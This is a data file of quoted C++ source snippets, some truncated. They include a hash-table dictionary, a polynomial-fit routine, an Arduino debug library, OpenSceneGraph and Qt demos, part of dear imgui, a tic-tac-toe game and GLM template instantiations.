    "#include <iostream>\r\n#include \"../include/seperatechaining.h\"\r\nusing namespace std;\r\n\r\nsepchain::sepchain()\r\n{\r\n\thead = NULL;\r\n\ttail = NULL;\r\n}\r\n\r\nint hashfunc(char* val, int size)\r\n{\r\n\tint index = 0, i, t, n = 0;\r\n\t\r\n\tfor(i = 0; ; i++)\r\n\t{\r\n\t\tif(val[i] >= 'A' && val[i] <= 'Z')\r\n\t\t{\r\n\t\t\tt = (val[i] + 32) * (i+1);\r\n\t\t}\r\n\t\t\r\n\t\telse if(val[i] >= 'a' && val[i] <= 'z')\r\n\t\t{\r\n\t\t\tt = val[i] * (i+1);\r\n\t\t}\r\n\t\t\r\n\t\telse if(val[i] == '\\0')\r\n\t\t{\r\n\t\t\tbreak;\r\n\t\t}\r\n\t\tn = (n + t) % size;\r\n\t}\r\n\t\r\n\tindex = n % size;\r\n\treturn index;\r\n}\r\n\r\nvoid sepchain::enter(char* v, char* m, char* ant, char* syn)\r\n{\r\n\tnodes* temp = new nodes;\r\n\ttemp->val = v;\r\n\ttemp->mea = m;\r\n\ttemp->ant = ant;\r\n\ttemp->syn = syn;\r\n\t\r\n\ttemp->next = NULL;\r\n\t\r\n\tif(head == NULL)\r\n\t{\r\n\t\thead = temp;\r\n\t\ttail = temp;\r\n\t}\r\n\t\r\n\telse \r\n\t{\r\n\t\ttail->next = temp;\r\n\t\ttail = temp;\r\n\t}\r\n}\r\n\r\nvoid sepchain::search(char* v)\r\n{\r\n\tif(head == NULL)\r\n\t{\r\n\t\tcout << \"\\nPARTICULAR INDEX IS EMPTY\\n\";\r\n\t}\r\n\t\r\n\telse \r\n\t{\r\n\t\tbool b = true;\r\n\t\tnodes* temp = new nodes;\r\n\t\ttemp = head;\r\n\t\twhile(temp->next != NULL)\r\n\t\t{\r\n\t\t\tb = true;\r\n\t\t\tfor(int i = 0; ; i++)\r\n\t\t\t{\r\n\t\t\t\t\r\n\t\t\t\tif(temp->val[i] >= 'a' && temp->val[i] <= 'z')\r\n\t\t\t\t{\r\n\t\t\t\t\tif(temp->val[i] != v[i] && temp->val[i] != (v[i] + 32))\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tb = false;\r\n\t\t\t\t\t}\r\n\t\t\t\t}\r\n\t\t\t\t\r\n\t\t\t\telse if(temp->val[i] >= 'A' && temp->val[i] <= 'Z')\r\n\t\t\t\t{\r\n\t\t\t\t\tif(temp->val[i] != v[i] && temp->val[i] != (v[i] - 32))\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tb = false;\r\n\t\t\t\t\t}\r\n\t\t\t\t}\r\n\t\t\t\t\r\n\t\t\t\telse\r\n\t\t\t\t{\r\n\t\t\t\t\tif(temp->val[i] != v[i])\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tb = false;\r\n\t\t\t\t\t}\r\n\t\t\t\t}\r\n\t\t\t\t\r\n\t\t\t\tif(temp->val[i] == '\\0')\r\n\t\t\t\t{\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\t\r\n\t\t\tif(b)\r\n\t\t\t{\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t\ttemp = temp->next;\r\n\t\t}\r\n\t\t\r\n\t\tb = true;\r\n\t\tfor(int i = 0; ; i++)\r\n\t\t{\r\n\t\t\tif(temp->val[i] >= 'a' && temp->val[i] <= 'z')\r\n\t\t\t{\r\n\t\t\t\tif(temp->val[i] != v[i] && temp->val[i] != (v[i] + 32))\r\n\t\t\t\t{\r\n\t\t\t\t\tb = false;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\t\r\n\t\t\telse if(temp->val[i] >= 'A' && temp->val[i] <= 'Z')\r\n\t\t\t{\r\n\t\t\t\tif(temp->val[i] != v[i] && temp->val[i] != (v[i] - 32))\r\n\t\t\t\t{\r\n\t\t\t\t\tb = false;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\t\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\tif(temp->val[i] != v[i])\r\n\t\t\t\t{\r\n\t\t\t\t\tb = false;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\t\r\n\t\t\tif(temp->val[i] == '\\0')\r\n\t\t\t{\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t}\r\n\t\t\t\r\n\t\tif(b)\r\n\t\t{\r\n\t\t\tcout << \"\\nWORD    : \" << temp->val ;\r\n\t\t\tcout << \"\\nMEANING : \" << temp->mea ;\r\n\t\t\tcout << \"\\nANTONYM : \" << temp->ant ;\r\n\t\t\tcout << \"\\nSYNONYM : \" << temp->syn ;\r\n\t\t\t\r\n\t\t\tcout << endl;\r\n\t\t}\r\n\t\t\r\n\t\telse\r\n\t\t{\r\n\t\t\tcout << \"\\nNot Available\\n\";\r\n\t\t}\r\n\t\t\r\n\t}\r\n}\r\n\r\nvoid sepchain::del(char* val)\r\n{\r\n\tnodes* prev = new nodes;\r\n\tnodes* curr = new nodes;\r\n\t\r\n\tif(head == NULL)\r\n\t{\r\n\t\tcout << \"\\nNot Available\\n\";\r\n\t\tdelete curr;\r\n\t\tdelete prev;\r\n\t\treturn;\r\n\t}\r\n\t\r\n\telse \r\n\t{\r\n\t\tcurr = head;\r\n\t\tprev = head;\r\n\t\t\r\n\t\tif(curr->val == val && curr->next == NULL)\r\n\t\t{\r\n\t\t\thead = NULL;\r\n\t\t\ttail = NULL;\r\n\t\t\tcurr = NULL;\r\n\t\t}\r\n\t\t\r\n\t\telse if(curr->val == val && curr->next != NULL)\r\n\t\t{\r\n\t\t\tcurr = curr->next;\r\n\t\t\thead = curr;\r\n\t\t\tcurr = NULL;\r\n\t\t}\r\n\t\t\r\n\t\telse\r\n\t\t{\r\n\t\t\twhile(curr->val != val && curr->next != NULL)\r\n\t\t\t{\r\n\t\t\t\tprev = curr;\r\n\t\t\t\tcurr = curr->next;\r\n\t\t\t}\r\n\t\t\t\r\n\t\t\tif(curr->val == val && curr->next != NULL)\r\n\t\t\t{\r\n\t\t\t\tprev->next = curr->next;\r\n\t\t\t\tprev = NULL;\r\n\t\t\t}\r\n\t\t\t\r\n\t\t\telse if(curr->val == val && curr->next == NULL)\r\n\t\t\t{\r\n\t\t\t\tprev->next = NULL;\r\n\t\t\t\ttail = prev;\r\n\t\t\t\tprev = NULL;\r\n\t\t\t}\r\n\t\t\t\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\tprev = NULL;\r\n\t\t\t\tcurr = NULL;\r\n\t\t\t\tcout << \"\\nNot Available\\n\";\r\n\t\t\t}\r\n\t\t}\r\n\t\t\r\n\t\tdelete curr;\r\n\t\tdelete prev;\r\n\t}\r\n}\r\n",
    "// ********************************************************************\n// * Code PolyFit                                                     *\n// * Written by Ianik Plante                                          *\n// *                                                                  *\n// * KBR                                                              *\n// * 2400 NASA Parkway, Houston, TX 77058                             *\n// * Ianik.Plante-1@nasa.gov                                          *\n// *                                                                  *\n// * This code is used to fit a series of n points with a polynomial  *\n// * of degree k, and calculation of error bars on the coefficients.  *\n// * If error is provided on the y values, it is possible to use a    *\n// * weighted fit as an option. Another option provided is to fix the *\n// * intercept value, i.e. the first parameter.                       *\n// *                                                                  *\n// * This code has been written partially using data from publicly    *\n// * available sources.                                               *\n// *                                                                  *  \n// * The code works to the best of the author's knowledge, but some   *   \n// * bugs may be present. This code is provided as-is, with no        *\n// * warranty of any kind. By using this code you agree that the      * \n// * author, the company KBR or NASA are not responsible for possible *\n// * problems related to the usage of this code.                      * \n// *                                                                  *   \n// * The program has been reviewed and approved by export control for * \n// * public release. However some export restriction exists. Please   *    \n// * respect applicable laws.                                         *\n// *                                                                  *   \n// ********************************************************************\n\n\n#include <iostream>\n#include <fstream>\n#include <vector>\n#include <math.h>\n#include <cmath>\n#include <iomanip>\n#include<opencv2\\opencv.hpp>\n#include\"polyfit.h\"\n\nusing namespace std;\nusing namespace cv;\n\n#define MAXIT 100\n#define EPS 3.0e-7\n#define FPMIN 1.0e-30\n\n\n\n/*\n * zlib License\n *\n * Regularized Incomplete Beta Function\n *\n * Copyright (c) 2016, 2017 Lewis Van Winkle\n * http://CodePlea.com\n *\n * This software is provided 'as-is', without any express or implied\n * warranty. In no event will the authors be held liable for any damages\n * arising from the use of this software.\n *\n * Permission is granted to anyone to use this software for any purpose,\n * including commercial applications, and to alter it and redistribute it\n * freely, subject to the following restrictions:\n *\n * 1. The origin of this software must not be misrepresented; you must not\n *    claim that you wrote the original software. If you use this software\n *    in a product, an acknowledgement in the product documentation would be\n *    appreciated but is not required.\n * 2. Altered source versions must be plainly marked as such, and must not be\n *    misrepresented as being the original software.\n * 3. This notice may not be removed or altered from any source distribution.\n */\n\n#define STOP 1.0e-8\n#define TINY 1.0e-30\n\n // Adapted from https://github.com/codeplea/incbeta\ndouble incbeta(double a, double b, double x) {\n    if (x < 0.0 || x > 1.0) return 1.0;\n\n    if (a <= 0.) {\n        std::cout << \"Warning: a should be >0\";\n        return 0.;\n    }\n\n    if (b <= 0.) {\n        std::cout << \"Warning: b should be >0\";\n        return 0.;\n    }\n\n\n    /*The continued fraction converges nicely for x < (a+1)/(a+b+2)*/\n    if (x > (a + 1.0) / (a + b + 2.0)) {\n        return (1.0 - incbeta(b, a, 1.0 - x)); /*Use the fact that beta is symmetrical.*/\n    }\n\n    /*Find the first part before the continued fraction.*/\n    const double lbeta_ab = lgamma(a) + lgamma(b) - lgamma(a + b);\n    const double front = exp(log(x) * a + log(1.0 - x) * b - lbeta_ab) / a;\n\n    /*Use Lentz's algorithm to evaluate the continued fraction.*/\n    double f = 1.0, c = 1.0, d = 0.0;\n\n    int i, m;\n    for (i = 0; i <= 200; ++i) {\n        m = i / 2;\n\n        double numerator;\n        if (i == 0) {\n            numerator = 1.0; /*First numerator is 1.0.*/\n        }\n        else if (i % 2 == 0) {\n            numerator = (m * (b - m) * x) / ((a + 2.0 * m - 1.0) * (a + 2.0 * m)); /*Even term.*/\n        }\n        else {\n            numerator = -((a + m) * (a + b + m) * x) / ((a + 2.0 * m) * (a + 2.0 * m + 1)); /*Odd term.*/\n        }\n\n        /*Do an iteration of Lentz's algorithm.*/\n        d = 1.0 + numerator * d;\n        if (fabs(d) < TINY) d = TINY;\n        d = 1.0 / d;\n\n        c = 1.0 + numerator / c;\n        if (fabs(c) < TINY) c = TINY;\n\n        const double cd = c * d;\n        f *= cd;\n\n        /*Check for stop.*/\n        if (fabs(1.0 - cd) < STOP) {\n            return front *",
    "#include \"debuggery.h\"\n\n/// @brief Private function for shared initialisation tasks.\n/// @param bAllowColour true to allow, false to forbid.\nvoid Debuggery_::_init(bool bAllowColour)\n    {\n    _bAllowColour = bAllowColour;\n#ifdef ESP32 \n    delay(1000); // Wait a sec for the serial port to catch up\n#endif\n    }\n\n\n/// @brief Overloaded function to initialise Debuggery.\n/// @param bAllowColour Allow colour is true.\n/// Use false if in the Arduino ID as the serial monitor does not support colour.\n/// USe true in the VSCODE IDE.\nvoid Debuggery_::initialise(bool bAllowColour)\n    {\n     if (Serial)\n         {\n         Serial.flush();\n         //Serial.end();\n         }\n    Serial.begin(115200);\n    _init(bAllowColour);\n    }\n\n\n/// @brief Overloaded function to initialise Debuggery.\n/// @param bAllowColour Allow colour is true.\n/// Use false if in the Arduino ID as the serial monitor does not support colour.\n/// USe true in the VSCODE IDE.\n/// @param speed Sets the baud rate of the serial port\nvoid Debuggery_::initialise(bool bAllowColour, unsigned long speed)\n    {\n     if (Serial)\n         {\n         Serial.flush();\n         //Serial.end();\n         }\n    Serial.begin(speed);\n    _init(bAllowColour);\n    }\n\n\n/// @brief Overloaded function to initialise Debuggery.\n/// @param bAllowColour Allow colour is true.\n/// Use false if in the Arduino ID as the serial monitor does not support colour.\n/// USe true in the VSCODE IDE.\n/// @param speed Bits per second (baud).\n/// @param config Sets data, parity, and stop bits. Valid values are listed\n/// at https://www.arduino.cc/reference/en/language/functions/communication/serial/begin/\nvoid Debuggery_::initialise(bool bAllowColour, unsigned long speed, uint8_t config)\n    {\n     if (Serial)\n         {\n         Serial.flush();\n         //Serial.end();\n         }\n    Serial.begin(speed, config);\n    _init(bAllowColour);\n    }\n\n/// @brief Overloaded operator to test if the serial port has started.  Returns true if the specified serial port is available.\n/// noting that some boards will return true regardless.  See https://www.arduino.cc/reference/en/language/functions/communication/serial/ifserial/\nDebuggery_::operator bool()\n    {\n    return(Serial);\n    }\n\n\n/// @brief Used in conjuction with the debug_assert macro.\n/// @param func (May be NULL) the name of the function where the assert was called\n/// @param file The name of the file where the assert was called\n/// @param line The line number in the source file of the failed assertion.\n/// @param failedExpr An expression that evaluates to nonzero (true) or 0 expressed as a string\nvoid Debuggery_::__assert(const char* func, const char* file, int line, const char* failedExpr)\n    {\n    setColor(93, 41); // yellow fg, dull red bg\n    print(F(\"Assertion failed: (\"));\n    print(failedExpr);\n    if (func != NULL)\n        {\n        print(F(\"), function:\"));\n        print(func);\n        }\n    print(F(\", file:\"));\n    print(file);\n    print(F(\", line:\"));\n    print(line);\n    print(F(\".\"));\n    resetColour();\n    println(F(\"\"));\n    flush(); // make sure it is all printed before we stop\n    delay(100); // and some space just in case.\n    #ifdef ESP32 // esp32 keeps restarting on abort\n    while (true);\n    #endif\n    abort(); // end the program.\n    }\n\n\n/// @brief Displays the Board name, progName and a greeting \n/// usually used in setup when establishing the app as a start up message.\n/// @param progName Name of the application\n/// @param greeting A greeting or version number as a char*.\nvoid Debuggery_::progAnnounce(const char* progName, const char* greeting)\n    {\n    _progAnnounce(progName, greeting);\n    }\n\n\n\n/// @brief Displays the  Board name, progName and a greeting as a hello message\n/// usually used in setup when establishing the app as a start up message.\n/// @param progName A string expressing the name of the program.\nvoid Debuggery_::progAnnounce(const char* progName)\n    {\n    _progAnnounce(progName, NULL);\n    }\n\n\nvoid Debuggery_::_progAnnounce(const char* progName, const char* greeting)\n    {\n    setColour(94); // bright blue\n    print(progName);\n    resetColour();\n    if (greeting == NULL)\n        {\n        println(F(\": 'Hello!'\"));\n        }\n    else\n        {\n        print(F(\": '\"));\n        print(greeting);\n        println(F(\"'\"));\n        }\n    setColour(95); // bright magenta\n    print(F(\"BOARD_NAME selected is \"));\n    setColour(96); // bright cyan\n    print(BOARD_NAME);\n    setColour(95); // bright magenta\n    println(\".\");\n    resetColour();\n    }\n\n/// @brief When inserted (once only) in a loop as the last item, will report \n/// the number of loops per second displaying every 'reportEvery' number of seconds.\n/// @param reportEvery const uint8_t Frequency of a 'report display' in seconds.\nvoid Debuggery_::speedTest(const uint8_t reportEvery)\n    {\n    static unsigned long timeReport = 0;\n    static unsigned long loopCount = 0;\n    static unsigned long loopReportCount = 0;\n    static unsigned long loopTime = 0;",
    "#include <iostream>\n#include <osgDB/ReadFile>\n#include <osg/ShapeDrawable>\n#include <osg/Geode>\n#include <osg/Group>\n#include <osg/PositionAttitudeTransform>\n#include <osg/AnimationPath>\n#include <osg/MatrixTransform>\n#include <osg/Light>\n#include <osg/LightSource>\n#include <osg/StateSet>\n#include <osgGA/TrackballManipulator>\n#include <osgViewer/Viewer>\n#include <osg/Texture2D>\n#include <osg/TexGen>\n\n\n// Funci\u00f3n para crear una ruta de animaci\u00f3n de rotaci\u00f3n\nosg::ref_ptr<osg::AnimationPath> createRotationPath() {\n  osg::ref_ptr<osg::AnimationPath> animationPath = new osg::AnimationPath();\n  animationPath->setLoopMode(osg::AnimationPath::LOOP);\n\n  const double degreesPerSecond = 40.0; // Grados por segundo\n  const double sampleInterval = 1.0; // Intervalo de muestreo en segundos\n  const unsigned int numSamples = 40;   // N\u00famero de muestras de la animaci\u00f3n\n\n  for (unsigned int i = 0; i <= numSamples; ++i) {\n      double time = i * sampleInterval;\n      double angle = osg::DegreesToRadians(degreesPerSecond * time);\n\n      osg::Quat rotation(angle, osg::Vec3(0.0, 1.0, 1.0));\n      animationPath->insert(time, osg::AnimationPath::ControlPoint(osg::Vec3(), rotation));\n  }\n\n  return animationPath;\n}\n\nint main(int argc, char* argv[]) {\n  \n  // Comprobar par\u00e1metros de l\u00ednea de comandos\n  if (argc != 2) {\n    std::cerr << \"Usage: \" << argv[0] << \" <model file>\\n\";\n    exit(1);\n  }\n\n  // Cargar el modelo\n  osg::ref_ptr<osg::Node> loadedModel = osgDB::readNodeFile(argv[1]);\n  if (!loadedModel) {\n    std::cerr << \"Problem opening '\" << argv[1] << \"'\\n\";\n    exit(1);\n  }\n\n  // A\u00f1adir textura \n  osg::ref_ptr<osg::StateSet> ss = loadedModel->getOrCreateStateSet();\n\n  osg::ref_ptr<osg::Image> image = osgDB::readImageFile(\"texture.png\"); \n  osg::ref_ptr<osg::Texture2D> tex(new osg::Texture2D());               \n  tex->setImage(image);                                                 \n  ss->setTextureAttributeAndModes(0, tex);                              \n\n  // Crear el nodo ra\u00edz\n  osg::ref_ptr<osg::Group> root(new osg::Group());\n\n  // Crear un nodo de transformaci\u00f3n para la rotaci\u00f3n del cubo\n  osg::ref_ptr<osg::PositionAttitudeTransform> rotationNode = new osg::PositionAttitudeTransform();\n  rotationNode->addChild(loadedModel);\n  // Crear la ruta de animaci\u00f3n de rotaci\u00f3n y agregarla al nodo de rotaci\u00f3n\n  osg::ref_ptr<osg::AnimationPathCallback> rotationCallback = new osg::AnimationPathCallback();\n  rotationCallback->setAnimationPath(createRotationPath());\n  rotationNode->setUpdateCallback(rotationCallback);\n\n  // Crear pat para el primer cubo\n  osg::ref_ptr<osg::PositionAttitudeTransform> cube1 = new osg::PositionAttitudeTransform();\n  cube1->addChild(rotationNode);\n  cube1->setPosition(osg::Vec3(-2.0, 0.0, 0.0));\n\n  // Crear para para el segundo cubo\n  osg::ref_ptr<osg::PositionAttitudeTransform> cube2 = new osg::PositionAttitudeTransform();\n  cube2->addChild(rotationNode);\n  cube2->setPosition(osg::Vec3(2.0, 0.0, 0.0));\n\n  // A\u00f1adir nueva fuente de luz\n  osg::ref_ptr<osg::PositionAttitudeTransform> lightPAT(new osg::PositionAttitudeTransform());\n  lightPAT->setPosition(osg::Vec3(5.0, 12.0, 3.0));\n  lightPAT->setScale(osg::Vec3(0.1, 0.1, 0.1));\n\n  // Agregar luz al nodo ra\u00edz\n  root->addChild(lightPAT);\n\n  // Setup GL_LIGHT1. Leave GL_LIGHT0 as it is by default (enabled)\n  osg::ref_ptr<osg::LightSource> lightSource(new osg::LightSource());\n  lightSource->addChild(loadedModel);\n  lightSource->getLight()->setLightNum(1);\n  lightSource->getLight()->setPosition(osg::Vec4(0.0, 0.0, 0.0, 1.0));\n  lightSource->getLight()->setDiffuse(osg::Vec4(1.0, 1.0, 0.0, 1.0));\n\n  lightPAT->addChild(lightSource);\n\n  ss->setMode(GL_LIGHT1, osg::StateAttribute::ON);\n      \n  // Agregar los nodos con los cubos al nodo ra\u00edz\n  root->addChild(cube1);\n  root->addChild(cube2);\n\n  // Crear un visor y establecer la escena\n  osgViewer::Viewer viewer;\n  viewer.setSceneData(root);\n\n  // Configurar el manipulador de c\u00e1mara para permitir la interacci\u00f3n con el rat\u00f3n\n  osg::ref_ptr<osgGA::TrackballManipulator> manipulator = new osgGA::TrackballManipulator();\n  viewer.setCameraManipulator(new osgGA::TrackballManipulator);\n\n  // Iniciar el bucle de visualizaci\u00f3n\n  return viewer.run();\n}\n",
    "// dear imgui, v1.78\n// (widgets code)\n\n/*\n\nIndex of this file:\n\n// [SECTION] Forward Declarations\n// [SECTION] Widgets: Text, etc.\n// [SECTION] Widgets: Main (Button, Image, Checkbox, RadioButton, ProgressBar, Bullet, etc.)\n// [SECTION] Widgets: Low-level Layout helpers (Spacing, Dummy, NewLine, Separator, etc.)\n// [SECTION] Widgets: ComboBox\n// [SECTION] Data Type and Data Formatting Helpers\n// [SECTION] Widgets: DragScalar, DragFloat, DragInt, etc.\n// [SECTION] Widgets: SliderScalar, SliderFloat, SliderInt, etc.\n// [SECTION] Widgets: InputScalar, InputFloat, InputInt, etc.\n// [SECTION] Widgets: InputText, InputTextMultiline\n// [SECTION] Widgets: ColorEdit, ColorPicker, ColorButton, etc.\n// [SECTION] Widgets: TreeNode, CollapsingHeader, etc.\n// [SECTION] Widgets: Selectable\n// [SECTION] Widgets: ListBox\n// [SECTION] Widgets: PlotLines, PlotHistogram\n// [SECTION] Widgets: Value helpers\n// [SECTION] Widgets: MenuItem, BeginMenu, EndMenu, etc.\n// [SECTION] Widgets: BeginTabBar, EndTabBar, etc.\n// [SECTION] Widgets: BeginTabItem, EndTabItem, etc.\n// [SECTION] Widgets: Columns, BeginColumns, EndColumns, etc.\n\n*/\n\n#if defined(_MSC_VER) && !defined(_CRT_SECURE_NO_WARNINGS)\n#define _CRT_SECURE_NO_WARNINGS\n#endif\n\n#include \"imgui.h\"\n#ifndef IMGUI_DISABLE\n\n#ifndef IMGUI_DEFINE_MATH_OPERATORS\n#define IMGUI_DEFINE_MATH_OPERATORS\n#endif\n#include \"imgui_internal.h\"\n\n#include <ctype.h>      // toupper\n#if defined(_MSC_VER) && _MSC_VER <= 1500 // MSVC 2008 or earlier\n#include <stddef.h>     // intptr_t\n#else\n#include <stdint.h>     // intptr_t\n#endif\n\n// Visual Studio warnings\n#ifdef _MSC_VER\n#pragma warning (disable: 4127)     // condition expression is constant\n#pragma warning (disable: 4996)     // 'This function or variable may be unsafe': strcpy, strdup, sprintf, vsnprintf, sscanf, fopen\n#if defined(_MSC_VER) && _MSC_VER >= 1922 // MSVC 2019 16.2 or later\n#pragma warning (disable: 5054)     // operator '|': deprecated between enumerations of different types\n#endif\n#endif\n\n// Clang/GCC warnings with -Weverything\n#if defined(__clang__)\n#if __has_warning(\"-Wunknown-warning-option\")\n#pragma clang diagnostic ignored \"-Wunknown-warning-option\"         // warning: unknown warning group 'xxx'                      // not all warnings are known by all Clang versions and they tend to be rename-happy.. so ignoring warnings triggers new warnings on some configuration. Great!\n#endif\n#pragma clang diagnostic ignored \"-Wunknown-pragmas\"                // warning: unknown warning group 'xxx'\n#pragma clang diagnostic ignored \"-Wold-style-cast\"                 // warning: use of old-style cast                            // yes, they are more terse.\n#pragma clang diagnostic ignored \"-Wfloat-equal\"                    // warning: comparing floating point with == or != is unsafe // storing and comparing against same constants (typically 0.0f) is ok.\n#pragma clang diagnostic ignored \"-Wformat-nonliteral\"              // warning: format string is not a string literal            // passing non-literal to vsnformat(). yes, user passing incorrect format strings can crash the code.\n#pragma clang diagnostic ignored \"-Wsign-conversion\"                // warning: implicit conversion changes signedness\n#pragma clang diagnostic ignored \"-Wzero-as-null-pointer-constant\"  // warning: zero as null pointer constant                    // some standard header variations use #define NULL 0\n#pragma clang diagnostic ignored \"-Wdouble-promotion\"               // warning: implicit conversion from 'float' to 'double' when passing argument to function  // using printf() is a misery with this as C++ va_arg ellipsis changes float to double.\n#pragma clang diagnostic ignored \"-Wenum-enum-conversion\"           // warning: bitwise operation between different enumeration types ('XXXFlags_' and 'XXXFlagsPrivate_')\n#pragma clang diagnostic ignored \"-Wdeprecated-enum-enum-conversion\"// warning: bitwise operation between different enumeration types ('XXXFlags_' and 'XXXFlagsPrivate_') is deprecated\n#pragma clang diagnostic ignored \"-Wimplicit-int-float-conversion\"  // warning: implicit conversion from 'xxx' to 'float' may lose precision\n#elif defined(__GNUC__)\n#pragma GCC diagnostic ignored \"-Wpragmas\"                  // warning: unknown option after '#pragma GCC diagnostic' kind\n#pragma GCC diagnostic ignored \"-Wformat-nonliteral\"        // warning: format not a string literal, format string not checked\n#pragma GCC diagnostic ignored \"-Wclass-memaccess\"          // [__GNUC__ >= 8] warning: 'memset/memcpy' clearing/writing an object of type 'xxxx' with no trivial copy-assignment; use assignment or value-initialization instead\n#endif\n\n//-------------------------------------------------------------------------\n// Data\n//-------------------------------------------------------------------------\n\n// Those MIN/MAX values are not define because we need to point to them\nstatic const signed char    IM_S8_MIN  = -128;\nstatic const signed char    IM_S8_MAX  = 127;\nstatic const unsig",
    "#include <iostream>\r\nusing namespace std;\r\n\r\nvoid drawBoard(char board[3][3]) {\r\n    cout << \" -\\n\";\r\n    for (int i = 0; i < 3; i++) {\r\n        cout << \" \";\r\n        for (int j = 0; j < 3; j++) {\r\n            cout << board[i][j] << \" \";\r\n        }\r\n        cout << \"\\n -\\n\";\r\n    }\r\n}\r\n\r\nbool checkWin(char board[3][3], char player) {\r\n    for (int i = 0; i < 3; i++) {\r\n        if (board[i][0] == player && board[i][1] == player && board[i][2] == player)\r\n            return true;\r\n        if (board[0][i] == player && board[1][i] == player && board[2][i] == player)\r\n            return true;\r\n    }\r\n    if (board[0][0] == player && board[1][1] == player && board[2][2] == player)\r\n        return true;\r\n    if (board[0][2] == player && board[1][1] == player && board[2][0] == player)\r\n        return true;\r\n    return false;\r\n}\r\n\r\nint main() {\r\n    char board[3][3] = { {' ', ' ', ' '}, {' ', ' ', ' '}, {' ', ' ', ' '} };\r\n    char player = 'X';\r\n    int row, col;\r\n    int turn;\r\n    cout << \"Welcome to Tic-Tac-Toe!\\n\";\r\n    for (turn = 0; turn < 9; turn++) {\r\n        drawBoard(board);\r\n        while (true) {\r\n            cout << \"Player \" << player << \", enter row (0-2) and column (0-2): \";\r\n            cin >> row >> col;\r\n            if (board[row][col] != ' ' || row < 0 || row > 2 || col < 0 || col > 2) {\r\n                cout << \"Invalid move. Try again.\\n\";\r\n            } else {\r\n                break;\r\n            }\r\n        }\r\n        board[row][col] = player;\r\n        if (checkWin(board, player)) {\r\n            drawBoard(board);\r\n            cout << \"Player \" << player << \" wins!\\n\";\r\n            break;\r\n        }\r\n        player = (player == 'X') ? 'O' : 'X';\r\n    }\r\n    drawBoard(board);\r\n    if (turn == 9 && !checkWin(board, 'X') && !checkWin(board, 'O')) {\r\n        cout << \"It's a draw!\\n\";\r\n    }\r\n    return 0;\r\n}\r\n",
    "\ufeff#include \"mainwindow.h\"\n#include \"ui_mainwindow.h\"\n#include \"mainwindowcalendar.h\"\n#include \"mainwindowtimer.h\"\n#include \"mainwindownote.h\"\n#include \"mainwindowpet.h\"\n#include \"QIcon\"\n#include \"QMessageBox\"\n\n\nMainWindow::MainWindow(QWidget *parent)\n    : QMainWindow(parent)\n    , ui(new Ui::MainWindow)\n{\n    ui->setupUi(this);\n\n    //\u8bbe\u7f6e\u8f6f\u4ef6\u56fe\u6807\n    setWindowIcon(QIcon(\":/logo/logotry.png\"));\n}\n\nMainWindow::~MainWindow()\n{\n    delete ui;\n}\n\n\nvoid MainWindow::on_tbM_C_clicked()\n{\n    MainWindowcalendar *MWcalendar = new MainWindowcalendar;//\u751f\u6210\u4e00\u4e2a\u53ebMWcalendar\u7684MainWindowcalendar\u6587\u4ef6\n    this->close();//\u70b9\u51fb\u6309\u94ae\u65f6\u5173\u95ed\u8fd9\u4e2a\u7a97\u53e3\u5373\u4e3b\u7a97\u53e3\n    MWcalendar->show();//\u663e\u793aMWcalendar\n}\n\n\n\nvoid MainWindow::on_tbM_T_clicked()\n{\n    MainWindowtimer *MWtimer = new MainWindowtimer;\n    this ->close();\n    MWtimer->show();\n}\n\n\n\nvoid MainWindow::on_tpM_N_clicked()\n{\n    MainWindownote *MWnote = new MainWindownote;\n    this->close();\n    MWnote->show();\n}\n\n\nvoid MainWindow::on_tbM_P_clicked()\n{\n    MainWindowpet *MWpet = new MainWindowpet;\n    this->close();\n    MWpet->show();\n}\n\n\n//\u4e0b\u9762\u6765\u8865\u5145\u4e00\u4e0b\u6682\u672a\u5b8c\u6210\u90e8\u5206\u7684\u63d0\u793a\nvoid MainWindow::on_toolButton_8_clicked()\n{\n    QMessageBox::warning(this,tr(\"\u62b1\u6b49\"),tr(\"\u8be5\u90e8\u5206\u529f\u80fd\u8fd8\u672a\u5b8c\u5584\uff0c\u656c\u8bf7\u671f\u5f85\"));\n}\n\n\nvoid MainWindow::on_toolButton_6_clicked()\n{\n    QMessageBox::warning(this,tr(\"\u62b1\u6b49\"),tr(\"\u8be5\u90e8\u5206\u529f\u80fd\u8fd8\u672a\u5b8c\u5584\uff0c\u656c\u8bf7\u671f\u5f85\"));\n}\n\n\nvoid MainWindow::on_toolButton_clicked()\n{\n    QMessageBox::warning(this,tr(\"\u62b1\u6b49\"),tr(\"\u8be5\u90e8\u5206\u529f\u80fd\u8fd8\u672a\u5b8c\u5584\uff0c\u656c\u8bf7\u671f\u5f85\"));\n}\n\n\nvoid MainWindow::on_toolButton_9_clicked()\n{\n    QMessageBox::warning(this,tr(\"\u62b1\u6b49\"),tr(\"\u8be5\u90e8\u5206\u529f\u80fd\u8fd8\u672a\u5b8c\u5584\uff0c\u656c\u8bf7\u671f\u5f85\"));\n}\n\n",
    "/// @ref core\n/// @file glm/glm.cpp\n\n#ifndef GLM_ENABLE_EXPERIMENTAL\n#define GLM_ENABLE_EXPERIMENTAL\n#endif\n#include <glm/gtx/dual_quaternion.hpp>\n#include <glm/gtc/vec1.hpp>\n#include <glm/gtc/quaternion.hpp>\n#include <glm/ext/scalar_int_sized.hpp>\n#include <glm/ext/scalar_uint_sized.hpp>\n#include <glm/glm.hpp>\n\nnamespace glm\n{\n// tvec1 type explicit instantiation\ntemplate struct vec<1, uint8, lowp>;\ntemplate struct vec<1, uint16, lowp>;\ntemplate struct vec<1, uint32, lowp>;\ntemplate struct vec<1, uint64, lowp>;\ntemplate struct vec<1, int8, lowp>;\ntemplate struct vec<1, int16, lowp>;\ntemplate struct vec<1, int32, lowp>;\ntemplate struct vec<1, int64, lowp>;\ntemplate struct vec<1, float32, lowp>;\ntemplate struct vec<1, float64, lowp>;\n\ntemplate struct vec<1, uint8, mediump>;\ntemplate struct vec<1, uint16, mediump>;\ntemplate struct vec<1, uint32, mediump>;\ntemplate struct vec<1, uint64, mediump>;\ntemplate struct vec<1, int8, mediump>;\ntemplate struct vec<1, int16, 